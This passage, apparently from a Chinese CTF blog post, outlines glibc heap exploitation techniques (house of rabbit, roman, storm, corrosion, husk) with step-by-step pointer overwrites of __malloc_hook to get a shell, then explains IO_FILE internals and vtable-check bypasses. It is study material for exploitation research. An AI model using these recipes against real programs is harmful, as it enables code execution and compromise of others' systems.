class="number">0</span>)+p64(<span class="number">0</span>)+p64(sys_addr)<span class="comment">#DUMMY finish overflow</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">			    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./heap-all-in-one/FSOP1.png"
                      
                > <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./heap-all-in-one/FSOP2.png"
                      
                ></p>
<h3 id="house-of-rabbit">house of rabbit</h3>
<ul>
<li>版本：2.23~2.31</li>
<li>目的：获得某块内存的任意写</li>
<li>核心：利用 <code>fastbin consolidate</code> 使 <code>fastbin</code> 中的 <code>fake chunk</code> 合法化</li>
<li>利用方式：
<ul>
<li>修改fd
<ul>
<li>申请 <code>chunk A (fastbin)</code>、<code>chunk B (smallbin)</code></li>
<li>释放 <code>chunk A</code>，修改 <code>A-&gt;fd</code> 指向地址 <code>X</code></li>
<li><code>free chunk B</code>使<code>fake chunk</code> 被放到了 <code>unsortedbin</code></li>
<li>分配足够大的 <code>chunk</code>等能触发 <code>malloc_consolidate</code> 使<code>fake chunk</code> 进入到对应的 <code>smallbin/largebin</code></li>
<li>取出 <code>fake chunk</code> 进行读写即可</li>
</ul></li>
<li>堆叠</li>
</ul></li>
<li>利用前提
<ul>
<li><code>UAF</code></li>
<li><code>fastbin</code>的<code>fd</code>或<code>size</code>域可写</li>
<li>超过<code>0x400</code>大小的堆分配</li>
</ul></li>
</ul>
<h3 id="house-of-roman">house of roman</h3>
<ul>
<li>版本：2.23~2.29</li>
<li>目的：<code>getshell</code></li>
<li>利用方式：
<ul>
<li><code>Step 1</code>
<ul>
<li>构造<code>chunk</code>
<ul>
<li><code>chunk_0</code>：<code>size=0x70</code>
<ul>
<li><code>fastbin_victim</code></li>
<li><code>UAF</code></li>
</ul></li>
<li><code>chunk_1</code>：<code>size=0x90</code>
<ul>
<li>使<code>chunk_2</code>页对齐</li>
</ul></li>
<li><code>chunk_2</code>：<code>size=0x90</code>
<ul>
<li><code>main_arena_use</code></li>
<li><code>unsortedbin</code></li>
</ul></li>
<li><code>chunk_3</code>：<code>size=0x70</code>
<ul>
<li><code>relative_offset_heap</code></li>
<li>写相对地址</li>
</ul></li>
</ul></li>
<li><code>free(chunk_2)</code></li>
<li><code>malloc(0x60)</code>
<ul>
<li><code>chunk_2-&gt;chunk_2_1(0x70,fake_libc_chunk)+chunk_2_2(0x20,leftover_main,unsortedbin)</code></li>
</ul></li>
<li><code>free(chunk_3)+free(chunk_0)</code>，都在<code>fastbin</code></li>
<li><code>edit(chunk_0-&gt;fd=fake_libc_chunk_prev_size_addr)</code></li>
<li><code>edit(fake_libc_chunk-&gt;fd=__malloc_hook-0x23)</code>
<ul>
<li>爆破</li>
</ul></li>
<li><code>malloc(0x60)*3</code></li>
</ul></li>
<li><code>Step 2</code>
<ul>
<li><code>malloc(chunk_4,size=0x90)+malloc(0x30)</code></li>
<li><code>free(chunk_4)</code></li>
<li><code>edit(chunk_4-&gt;bk=__malloc_hook-0x10)</code></li>
<li><code>malloc(malloc_hook_chunk,size=0x90)</code></li>
<li><code>edit(malloc_hook_chunk-&gt;fd=ogg_addr)</code></li>
</ul></li>
</ul></li>
<li>利用前提
<ul>
<li><code>UAF</code></li>
<li>不需要泄露地址</li>
<li>爆破16位，<code>1/40960</code></li>
</ul></li>
</ul>
<h3 id="house-of-storm">house of storm</h3>
<ul>
<li>版本：2.23~2.29</li>
<li>目的：任意地址写</li>
<li>伪造结构
<ul>
<li><code>unsorted_bin-&gt;fd = 0</code><br />
</li>
<li><code>unsorted_bin-&gt;bk = fake_chunk</code><br />
</li>
<li><code>large_bin-&gt;fd = 0</code><br />
</li>
<li><code>large_bin-&gt;bk = fake_chunk+8</code><br />
</li>
<li><code>large_bin-&gt;fd_nextsize = 0</code></li>
<li><code>large_bin-&gt;bk_nextsize = fake_chunk - 0x18 -5</code></li>
</ul></li>
<li>利用方式：
<ul>
<li><code>chunk_1</code>：<code>size=0x410</code></li>
<li><code>chunk_2</code>：<code>size=0x30</code></li>
<li><code>chunk_3</code>：<code>size=0x420</code></li>
<li><code>chunk_4</code>：<code>size=0x30</code></li>
<li><code>chunk_5</code>：<code>size=0x30</code></li>
<li><code>chunk_6</code>：<code>size=0x30</code></li>
<li><code>free(chunk_1)+free(chunk_3)+free(chunk_5)</code></li>
<li><code>malloc(chunk_5)</code></li>
<li><code>malloc(chunk_3)+free(chunk_3)</code></li>
<li><code>edit(chunk_3-&gt;bk=__malloc_hook-0x50)</code></li>
<li><code>edit(chunk_1-&gt;bk=__malloc_hook-0x50+8)</code></li>
<li><code>edit(chunk_1-&gt;bk_nextsize=__malloc_hook-0x50-0x18-5)</code></li>
<li><code>malloc(0x48)(__malloc_hook_chunk)</code></li>
<li><code>edit(__malloc_hook_chunk+0x40=ogg_addr)</code></li>
<li><code>malloc-&gt;getshell</code></li>
</ul></li>
<li>利用前提
<ul>
<li><code>UAF</code></li>
<li><code>unsortedbin attack</code>、<code>largebin attack</code></li>
</ul></li>
</ul>
<h3 id="house-of-corrosion">house of corrosion</h3>
<ul>
<li>版本：2.23~</li>
<li>目的：任意地址读写，任意地址值转移</li>
<li>伪造结构
<ul>
<li><code>chunk size = (target_addr - &amp;main_arena.fastbinsY) x 2 + 0x20</code></li>
</ul></li>
<li>利用方式：
<ul>
<li>读<code>target_addr</code>的<code>target_message</code>
<ul>
<li>释放<code>fastbin A</code>到<code>target_addr</code>使<code>A-&gt;fd</code>指向<code>target_message</code></li>
</ul></li>
<li>写<code>target_message</code>到<code>target_addr</code>
<ul>
<li><code>malloc(A,size=chunk size)</code></li>
<li><code>unsortedbin attack change global_max_fast</code></li>
<li><code>free(A)</code></li>
<li>使<code>A-&gt;fd</code>为<code>target_message</code></li>
<li><code>malloc(A)</code></li>
</ul></li>
<li>转移<code>attack_addr</code>的<code>target_message</code>到<code>target_addr</code>地址上
<ul>
<li><code>src_size=(attack_addr-fastbinY)*2+0x20</code></li>
<li><code>dst_size=(target_addr-fastbinY)*2+0x20</code></li>
<li><code>malloc(A,size=dst_size)</code></li>
<li><code>malloc(B,size=dst_size)</code></li>
<li><code>free(B)</code></li>
<li><code>free(A)</code></li>
<li><code>unsortedbin attack change global_max_fast</code></li>
<li>使<code>attack_addr</code>的<code>fd</code>指向的堆A的<code>fd</code>指向自己</li>
<li><code>malloc(A)</code>，<code>edit(A-&gt;size=src_size)</code>，<code>free(A)</code></li>
<li>此时A落入<code>target_addr</code>的<code>fd</code>指针值变成<code>target_message</code></li>
<li><code>edit(A-&gt;size=dst_size)</code>，落入<code>target_message</code>，<code>malloc(A)</code></li>
</ul></li>
</ul></li>
<li>利用前提
<ul>
<li><code>UAF</code>、堆溢出</li>
<li>不需要泄露地址，爆破<code>1/16</code></li>
<li>任意大小分配</li>
<li>可以修改<code>global_max_fast</code></li>
</ul></li>
</ul>
<h3 id="house-of-husk">house of husk</h3>
<ul>
<li>版本：2.23~2.35</li>
<li>目的：<code>backdoor or getshell</code></li>
<li>伪造结构
<ul>
<li><code>__printf_function_table!=NULL</code></li>
<li><code>__printf_arginfo_table=control_addr</code></li>
<li><code>__printf_arginfo_table[spec]=backdoor_addr</code></li>
</ul></li>
<li>执行顺序：
<ul>
<li><code>printf-&gt;vprintf-&gt;(if __printf_function_table!=NULL)printf_positional-&gt;__parse_one_specmb-&gt;(*__printf_arginfo_table[spec-&gt;info.spec])</code></li>
</ul></li>
<li>利用方式：
<ul>
<li><code>unsortedbin leak libc</code>、<code>unsortedbin attack global_max_fast</code></li>
</ul></li>
<li>利用前提
<ul>
<li><code>UAF</code>、堆溢出</li>
<li>任意大小分配</li>
<li>可以修改<code>global_max_fast</code></li>
</ul></li>
<li><code>printf</code>:
<ul>
<li><code>__vfprintf_internal</code>
<ul>
<li><code>buffered_vfprintf</code></li>
</ul></li>
<li><code>printf_positional</code>
<ul>
<li><code>__parse_one_specmb</code>
<ul>
<li><code>(*__printf_arginfo_table[spec-&gt;info.spec])</code></li>
</ul></li>
</ul></li>
</ul></li>
</ul>
<h1 id="io_file">IO_FILE</h1>
<h2 id="io数据结构">IO数据结构</h2>
<p>对于LBA硬盘来说，读写数据都必须一块一块的读，如果我们每次执行<code>read，write</code>时都是操作很少的数据，则对系统消耗非常大，因此，C库就想了一个好办法——缓冲区。所以，就比较好理解了，缓冲区是为了减少3坏操作外部硬件时的消耗产生的，一切都是以外部硬件为服务对象。</p>
<p>1.<strong>从外部硬件读取时</strong>。为了减少消耗，会一次从外部硬件读取一“块”数据，并放入缓冲区，然后当<code>target</code>需要时，再从头部慢慢读取，只到读完才再次从硬件读取。这个缓冲区叫输入缓冲区。 2.<strong>向外部硬件写入时</strong>。为了减少消耗，不会一有东西就写入，而是先将内容从<code>source</code>写入缓冲区，当缓冲区满了时候再将内存一起写入硬件。这个缓冲区叫输出缓冲区。</p>
<p>首先，以<strong>从外部硬件读取</strong>为例，我们要有输入缓冲区开始（base）、结尾（end）和当前（ptr）已经用了多少的指针。很明显当<code>ptr == end</code>时，说明输入缓冲区里的东西已经全部读完，需要重新从硬件读入。 同样，对于<strong>向外部硬件写入</strong>为例，我们要有输出缓冲区开始（base）、结尾（end）和当前（ptr）已经写了多少的指针。很明显当<code>ptr == end</code>时，说明输出缓冲区已经写满，可以向硬件写入了。</p>
<p>上面的内容看似非常清楚，但这里其实有一些比较容易混乱的地方。因为缓冲区内存储的是数据，输入、输出两者数据流动方向不同，但保护主体都一样，都是外部设备，所以<strong>有用的数据部分</strong>就有所不相同。 1. 对于输入缓冲区<code>ptr-end</code>是有用的数据，<code>base-ptr</code>为已使用的数据。 2. 对于输出缓冲区<code>base-ptr</code>是要写入硬件的内容（有用数据），<code>ptr-end</code>为空闲区域。 3. 两者结尾有所不同。 1. 对于输入缓冲区，因为从硬盘中读取的数据可能无法填满整个缓冲区的块，所以<code>_IO_buf_end != _IO_read_end</code>。输入缓冲区要使用<code>_IO_read_end</code>判断结束。 2. 对于输出缓冲区，缓冲区的结束就是输出缓冲区结束，<code>_IO_buf_end == _IO_write_end</code>。输出缓冲区往往使用<code>_IO_buf_end</code>判断结束。</p>
<p>虽然，输入、输出缓冲区作用不同，但原理上都是一块内存。一块外部设备可能既可以写入也可以读取，为了节省空间，我们可以定义一块缓冲区，需要输入的时候就做输入缓冲区，需要输出就做输出缓冲区。那么我们就有了8个指针。 <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *_IO_buf_base;    <span class="comment">//缓冲区的基地址</span></span><br><span class="line"><span class="type">char</span> *_IO_buf_end;     <span class="comment">//缓冲区的结束地址</span></span><br><span class="line"><span class="type">char</span> *_IO_read_base;   <span class="comment">//输入缓冲区基地址</span></span><br><span class="line"><span class="type">char</span> *_IO_read_ptr;    <span class="comment">//输入当前位置</span></span><br><span class="line"><span class="type">char</span> *_IO_read_end;    <span class="comment">//输入缓冲区结尾地址</span></span><br><span class="line"><span class="type">char</span> *_IO_write_base;  <span class="comment">//输出缓冲区基地址</span></span><br><span class="line"><span class="type">char</span> *_IO_write_ptr;   <span class="comment">//输出当前位置</span></span><br><span class="line"><span class="type">char</span> *_IO_write_end;   <span class="comment">//输出缓冲区结尾地址</span></span><br></pre></td></tr></table></figure></div></p>
<p><strong>从文件中读取</strong> 程序是从<code>fd</code>中读取一批数据到缓冲区中（<code>_IO_buf_base</code> 至 <code>_IO_buf_end</code>），<code>_IO_read_ptr</code> 指向已向<code>target</code>中写完的位置，既 <code>_IO_read_ptr</code> 至 <code>_IO_read_end</code> 为还没有写入<code>target</code>中的数据。当<code>_IO_read_ptr == _IO_read_end</code>时，说明输入缓冲区内已经没有可用数据，需要再次从文件中读入数据。</p>
<p><strong>向文件输出</strong> 程序是先将<code>source</code>中的数据写入到缓冲区中，<code>_IO_write_ptr</code> 指向已从<code>source</code>中写到的位置，既 <code>_IO_write_ptr</code> 至 <code>_IO_write_pend</code> 为还剩余的空间。当<code>_IO_write_ptr == _IO_buf_end</code>时，再全部写入<code>fd</code>中。</p>
<h2 id="io数据操作">IO数据操作</h2>
<h3 id="从硬盘中读入数据">1.从硬盘中读入数据</h3>
<ol type="1">
<li>从<code>fd</code>中读取一批（一块）数据到输入缓冲区中（<code>_IO_buf_base</code> 至 <code>_IO_buf_end</code>），同时对<code>_IO_read_base</code> <code>_IO_read_ptr</code> <code>_IO_read_end</code> 设置初始值。（<code>_IO_read_ptr == _IO_read_base</code> ，当然也可能不同）</li>
<li>从<code>_IO_read_ptr</code> 处向需要的内存中复制数据，同时把<code>_IO_read_ptr</code> 向后移位。</li>
<li>当<code>_IO_read_ptr == _IO_read_end</code>时，说明缓冲区内已经没有可用数据，需要再次从文件中读入数据。冲入第一步。</li>
</ol>
<h3 id="向硬盘中写入数据">2.向硬盘中写入数据</h3>
<ol type="1">
<li>先将<code>source</code>中的数据复制到输出缓冲区中，<code>_IO_write_ptr</code> 指向已写到的位置。</li>
<li>当<code>_IO_write_ptr == _IO_buf_end</code>时，将缓冲区中的内容全部写入<code>fd</code>中，并将<code>_IO_write_ptr</code>设置为 <code>_IO_write_base</code>，重复第一步。</li>
</ol>
<h3 id="申请缓冲区">3.申请缓冲区</h3>
<p>申请一块缓冲区，并设置<code>_IO_buf_base</code>为开头，<code>_IO_buf_end</code>为结尾。</p>
<h2 id="io_file_jumps-函数操作"><code>_IO_file_jumps</code> 函数操作</h2>
<h3 id="io_new_file_finish">1.<code>_IO_new_file_finish</code></h3>
<p>是文件结束的操作，所以它的操作如下 1. 清空所有缓冲区 2. 关闭（close）文件</p>
<h3 id="io_new_file_overflow">2.<code>_IO_new_file_overflow</code></h3>
<p>主要是处理当输出缓冲区用完时，向硬盘写入数据</p>
<p>当然，其实这个函数内部非常复杂，加入了一些检测。例如，如果缓冲区不存在则要<strong>初始化缓冲区</strong>。并且，这个函数的参数中有一个标志位 1. 如果 <code>ch == EOF</code>，则输出<code>f-&gt;_IO_write_ptr - f-&gt;_IO_write_base</code>的区间。 2. 如果 <code>ch != EOF</code>，并且<code>f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end</code>，则将缓冲区全部输出。 3. 如果 <code>ch == '\n'</code>，则输出 <code>f-&gt;_IO_write_ptr - f-&gt;_IO_write_base</code>加一个换行符。 4. 以上都不满足就返回<code>ch</code></p>
<h3 id="io_new_file_underflow">3.<code>_IO_new_file_underflow</code></h3>
<p>这个函数与<code>_IO_new_file_overflow</code>差不多，主要是用于从硬盘中读取数据，每次读取都是<code>_IO_buf_base</code>至<code>_IO_buf_end</code>。</p>
<p>为了防止硬盘中没有这么多数据，设置<code>_IO_read_end</code>为读取的总数。如果，缓冲区不存在则要<strong>初始化缓冲区</strong>。程序返回<code>_IO_read_ptr</code>指针。</p>
<h3 id="gi__io_default_uflow_io_default_uflow">4.<code>__GI__IO_default_uflow（_IO_default_uflow）</code></h3>
<p>这个函数就是调用<code>_IO_new_file_underflow</code>，并简单做了一些检测。</p>
<h3 id="gi__io_default_pbackfail_io_default_pbackfail">5.<code>__GI__IO_default_pbackfail（_IO_default_pbackfail）</code></h3>
<p>设置存储的函数，暂不重要。</p>
<h3 id="io_new_file_xsputn">6.<code>_IO_new_file_xsputn</code></h3>
<p>这个函数是主要目的是将数据从<code>source</code>放入输出输出缓冲区。显然，放入过程中还有几种情况。 1. 如果要写入的数据<strong>小于</strong>剩余的空间<code>_IO_write_ptr - _IO_buf_end</code>，那么就直接将数据写入输出缓冲区即可。 2. 如果要写入的数据<strong>大于</strong>剩余的空间<code>_IO_write_ptr - _IO_buf_end</code>。 1. 先将输出缓冲区填满，再调用<code>_IO_new_file_overflow</code>清空输出缓冲区。 2. 剩余的数据继续调用 <code>_IO_new_file_xsputn</code></p>
<p><strong>说明</strong>：我们平时的输出函数主要就是调用此函数。</p>
<h3 id="gi__io_file_xsgetn_io_file_xsgetn">7.<code>__GI__IO_file_xsgetn（_IO_file_xsgetn）</code></h3>
<p>这个函数是主要目的是将数据从输入缓冲区放入<code>target</code>。显然放入过程中还有几种情况。 1. 如果要读取的数据<strong>小于</strong>剩余的数据<code>_IO_read_ptr - _IO_read_end</code>，那么就直接将数据读取到<code>target</code>即可。 2. 如果要读取的数据<strong>大于</strong>剩余的数据<code>_IO_read_ptr - _IO_read_end</code>。 1. 先将输入缓冲区全部数据读出，再调用<code>_IO_new_file_underflow</code>从硬盘读入一块数据。 2. 如果需要读取数据特别多，就调用<code>__GI__IO_file_read</code>从硬盘直接读取数据。</p>
<p><strong>说明</strong>：我们平时的输入函数主要就是调用此函数。</p>
<h3 id="io_new_file_seekoff">8.<code>_IO_new_file_seekoff</code></h3>
<p>设置偏移函数，就是设置我们所说的<code>ptr</code>指针。</p>
<h3 id="io_default_seekpos">9.<code>_IO_default_seekpos</code></h3>
<p>就是调用<code>_IO_new_file_seekoff</code>。</p>
<h3 id="io_new_file_setbuf">10.<code>_IO_new_file_setbuf</code></h3>
<p>这个函数也比较简单，看名字就知道是设置缓冲区的，作用就是初始化各个缓冲区 1. <code>_IO_write_base = _IO_write_ptr = _IO_write_end = _IO_buf_base</code> 2. <code>_IO_read_base = _IO_read_ptr = _IO_read_end = _IO_buf_base</code> （使用 <code>_IO_setg</code> 宏）</p>
<h3 id="io_new_file_sync">11.<code>_IO_new_file_sync</code></h3>
<p>同步函数，负责与硬盘和缓冲区之间进行同步。</p>
<h3 id="gi__io_file_doallocate_io_default_doallocate">12.<code>__GI__IO_file_doallocate（_IO_default_doallocate）</code></h3>
<p>这个就是申请缓冲区的函数，申请完之后还要把输入、输出缓冲区初始化。</p>
<h3 id="gi__io_file_read_io_file_read">13.<code>GI__IO_file_read（_IO_file_read）</code></h3>
<p>这个是输入的最终函数，它将<code>syscall_read</code>进行了一定的封装。</p>
<h3 id="io_new_file_write">14.<code>_IO_new_file_write</code></h3>
<p>这个是输出的最终函数，它将<code>syscall_write</code>进行了一定的封装。</p>
<h3 id="gi__io_file_seek_io_file_seek">15.<code>GI__IO_file_seek（_IO_file_seek）</code></h3>
<p>调用<code>__lseek64</code>。</p>
<h3 id="gi__io_file_close_io_file_close">16.<code>__GI__IO_file_close（_IO_file_close）</code></h3>
<p>就和名字一样，关闭文件。</p>
<h3 id="gi__io_file_stat_io_file_stat">17.<code>__GI__IO_file_stat（_IO_file_stat）</code></h3>
<p>获取文件描述符的状态。调用<code>__fxstat64</code>。</p>
<h3 id="io_default_showmanyc">18.<code>_IO_default_showmanyc</code></h3>
<p>此函数没用，返回-1。</p>
<h3 id="io_default_imbue">19.<code>_IO_default_imbue</code></h3>
<p>此函数没用。</p>
<h3 id="其他一些内容">20.其他一些内容</h3>
<h4 id="flag标志位"><strong>flag</strong>标志位</h4>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">`<span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="comment">/* Magic number */</span>`</span></span><br><span class="line">`<span class="meta">#<span class="keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 <span class="comment">/* Emulate old stdio. */</span>`</span></span><br><span class="line">`<span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000`</span></span><br><span class="line">`<span class="meta">#<span class="keyword">define</span> _IO_USER_BUF 1 <span class="comment">/* User owns buffer; don&#x27;t delete it on close. */</span>`</span></span><br><span class="line">`<span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED 2`</span></span><br><span class="line">`<span class="meta">#<span class="keyword">define</span> _IO_NO_READS 4 <span class="comment">/* Reading not allowed */</span>`</span></span><br><span class="line">`<span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8 <span class="comment">/* Writing not allowd */</span>`</span></span><br><span class="line">`<span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN 0x10`</span></span><br><span class="line">`<span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN 0x20`</span></span><br><span class="line">`<span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 <span class="comment">/* Don&#x27;t call close(_fileno) on cleanup. */</span>`</span></span><br><span class="line">`<span class="meta">#<span class="keyword">define</span> _IO_LINKED 0x80 <span class="comment">/* Set if linked (using _chain) to streambuf::_list_all.*/</span>`</span></span><br><span class="line">`<span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP 0x100`</span></span><br><span class="line">`<span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF 0x200`</span></span><br><span class="line">`<span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="comment">/* Set if put and get pointer logicly tied. */</span>`</span></span><br><span class="line">`<span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800`</span></span><br><span class="line">`<span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000`</span></span><br><span class="line">`<span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF 0x2000`</span></span><br><span class="line">`<span class="meta">#<span class="keyword">define</span> _IO_BAD_SEEN 0x4000`</span></span><br><span class="line">`<span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK 0x8000`</span></span><br></pre></td></tr></table></figure></div>
<h4 id="flush_io_do_flush"><strong>flush</strong>（<code>_IO_do_flush</code>）</h4>
<p>清空缓冲区，将输出缓冲区清空。</p>
<h4 id="全部清空函数fflush">全部清空函数（<code>fflush</code>）</h4>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> fflush(s) _IO_fflush (s)  <span class="comment">//  /assert/assert.c</span></span></span><br><span class="line"><span class="comment">// /libio/iofflush.c</span></span><br><span class="line"><span class="type">int</span> _IO_fflush (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_flush_all ();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> result;</span><br><span class="line">      CHECK_FILE (fp, EOF);</span><br><span class="line">      _IO_acquire_lock (fp);</span><br><span class="line">      result = _IO_SYNC (fp) ? EOF :<span class="number">0</span>;</span><br><span class="line">      _IO_release_lock (fp);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_fflush)</span><br></pre></td></tr></table></figure></div>
<p>可以看出 <code>fflush</code>函数在参数为空时，清空(<code>_IO_flush_all_lockp =&gt; _IO_OVERFLOW</code>)全部文件；不为空时，同步(<code>sync</code>)指定文件，两种情况执行步骤不同。</p>
<h4 id="缓冲区设置宏">缓冲区设置宏</h4>
<p><code>_IO_setg</code> <code>_IO_setp</code> 等等</p>
<h2 id="虚表检测">虚表检测</h2>
<p>虚表检测是2.24之后加入的内容，<code>IO_validate_vtable</code>检测如果虚表超出范围就进入<code>_IO_vtable_check</code>函数。各路大神找到的<code>house</code>很多都不是打<code>file</code>的跳表，而是其他处理跳表，但都差不太多。简要梳理如下。</p>
<ol type="1">
<li>2.23 的没有任何限制，可以将<code>vtable</code> 劫持在堆上并修改其内容，然后触发FSOP，</li>
<li>2.24 引入了<code>vtable check</code>，使得将<code>vtable</code> 整体劫持到堆上已不可能，大佬发现可以使用内部的<code>vtable</code>中<code>_IO_str_jumps</code>或<code>_IO_wstr_jumps</code>来进行利用。</li>
<li>2.31 中将<code>_IO_str_finish</code>函数中强制执行<code>free</code>函数，导致无法使用上述问题，因而催生出其他调用链。</li>
</ol>
<h3 id="虚表范围">虚表范围</h3>
<p>虚表位置判断主要在<code>IO_validate_vtable</code>函数，<strong>2.37以前</strong>判断区间为<code>_IO_helper_jumps - _IO_str_jumps</code>之间的区域 0xd60，里面有以下虚表 <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_IO_helper_jumps</span><br><span class="line">_IO_helper_jumps</span><br><span class="line">_IO_cookie_jumps</span><br><span class="line">_IO_proc_jumps</span><br><span class="line">_IO_str_chk_jumps</span><br><span class="line">_IO_wstrn_jumps</span><br><span class="line">_IO_wstr_jumps</span><br><span class="line">_IO_wfile_jumps_maybe_mmap</span><br><span class="line">_IO_wfile_jumps_mmap</span><br><span class="line">__GI__IO_wfile_jumps</span><br><span class="line">_IO_wmem_jumps</span><br><span class="line">_IO_mem_jumps</span><br><span class="line">_IO_strn_jumps</span><br><span class="line">_IO_obstack_jumps</span><br><span class="line">_IO_file_jumps_maybe_mmap</span><br><span class="line">_IO_file_jumps_mmap</span><br><span class="line">__GI__IO_file_jumps</span><br><span class="line">_IO_str_jumps</span><br></pre></td></tr></table></figure></div></p>
<h3 id="攻击_io_vtable_check">攻击<code>_IO_vtable_check</code></h3>
<p>在<code>IO_validate_vtable</code>函数检查如果虚表超出范围，会进入<code>_IO_vtable_check</code>函数， <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> attribute_hidden _IO_vtable_check (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="type">void</span> (*flag) (<span class="type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check) <span class="comment">//检查是否是外部重构的vtable</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure></div> 只是要满足一定条件。那么我们还是可以绕过虚表检测的 1. 泄露<code>ptr_guard</code>，反算<code>IO_accept_foreign_vtables</code>然后修改。 2. 因为<code>IO_accept_foreign_vtables</code>中基本都是0，直接将<code>ptr_guard</code>修改为<code>&amp;_IO_vtable_check</code>也可以。 但无论如何我们都需要有ld文件</p>
<h3 id="外置虚表">外置虚表</h3>
<p><code>check_stdfiles_vtables</code>函数是设置外置虚表的函数，如果能执行这个函数，也可以绕过虚表检测 <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span>  <span class="title function_">check_stdfiles_vtables</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_2_1_stdin_.vtable != &amp;_IO_file_jumps</span><br><span class="line">      || _IO_2_1_stdout_.vtable != &amp;_IO_file_jumps</span><br><span class="line">      || _IO_2_1_stderr_.vtable != &amp;_IO_file_jumps)</span><br><span class="line">    IO_set_accept_foreign_vtables 